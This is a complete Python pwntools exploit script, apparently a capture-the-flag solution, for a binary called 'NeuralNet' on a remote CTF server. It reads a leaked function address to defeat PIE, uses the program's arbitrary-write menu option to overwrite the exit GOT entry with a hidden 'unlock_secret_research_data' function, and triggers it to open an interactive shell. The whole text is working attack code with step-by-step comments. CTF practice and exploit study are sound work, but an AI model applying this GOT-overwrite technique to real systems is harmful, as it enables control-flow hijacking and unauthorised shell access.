#!/usr/bin/env python3
from pwn import *

# Set up the context for the binary
# This lets pwntools know about the architecture, symbols, etc.
context.binary = elf = ELF('./NeuralNet')

# Connect to the remote server
# To test locally, use: io = process()
io = remote('ctf.mf.grsu.by', 9076)

# 1. Defeat PIE by parsing the leaked address
io.recvuntil(b'predict_outcome): ')
leaked_addr_str = io.recvline().strip()
leaked_predict_addr = int(leaked_addr_str, 16)
log.info(f"Leaked predict_outcome address: {hex(leaked_predict_addr)}")

# Calculate the binary's base address
# base_address = leaked_address - symbol_offset
elf.address = leaked_predict_addr - elf.symbols['predict_outcome']
log.info(f"Calculated PIE base address: {hex(elf.address)}")

# 2. Identify Target addresses
# The address we want to WRITE TO is the GOT entry for 'exit'
# pwntools makes this easy: elf.got['function_name']
exit_got_addr = elf.got['exit']

# The VALUE we want to WRITE is the address of our win function
# pwntools makes this easy: elf.symbols['function_name']
unlock_secret_addr = elf.symbols['unlock_secret_research_data']

log.info(f"Address to overwrite (exit@GOT): {hex(exit_got_addr)}")
log.info(f"Value to write (unlock_secret_research_data address): {hex(unlock_secret_addr)}")

# 3. Perform the Arbitrary Write using "Neural Intervention"
log.info("Choosing option 3: Neural Intervention")
io.sendlineafter(b'> ', b'3')

# Send the address to write to (the 'where')
log.info(f"Sending address: {hex(exit_got_addr)}")
io.sendlineafter(b'> ', hex(exit_got_addr).encode())

# Send the value to write (the 'what')
log.info(f"Sending value: {hex(unlock_secret_addr)}")
io.sendlineafter(b'> ', hex(unlock_secret_addr).encode())

# 4. Trigger the exploit by calling the hijacked function
log.info("Choosing option 4: Exit (to trigger the hijacked GOT entry)")
io.sendlineafter(b'> ', b'4')

# 5. Enjoy the shell!
log.success("Shell should be popped!")
io.interactive()
